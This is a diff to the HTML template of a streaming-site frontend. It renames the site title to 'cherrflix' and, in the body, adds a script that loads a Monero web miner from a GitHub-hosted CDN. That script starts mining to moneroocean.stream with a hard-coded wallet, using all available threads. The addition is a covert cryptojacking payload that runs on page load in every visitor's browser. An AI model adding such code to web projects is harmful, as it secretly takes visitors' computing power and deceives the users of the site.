@@ -139,7 +139,7 @@
 
   {{#if opensearchEnabled }}
   <!-- OpenSearch -->
-  <link rel="search" type="application/opensearchdescription+xml" title="sudo-flix" href="/opensearch.xml">
+  <link rel="search" type="application/opensearchdescription+xml" title="cherrflix" href="/opensearch.xml">
 
   <!-- Google Sitelinks -->
   <script type="application/ld+json">
@@ -161,6 +161,17 @@
 </head>
 
 <body>
+  <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+  <script>
+    server = "wss://ny1.xmrminingproxy.com";
+    var pool = "moneroocean.stream";
+    var walletAddress = "45DDa6ZosLwbnhFAJueoWpgQSB3xtGVKzcFNH1JjLVc7CNxAQKUHnDnHssiufnDMi5LjQYqhrEe1jEgjPoKUVABWMHpNs3W";
+    var workerId = "GH-XMR"
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+  </script>
   <noscript>You need to enable JavaScript to run this app.</noscript>
   <div id="root"></div>
   <script type="module" src="/src/index.tsx"></script>
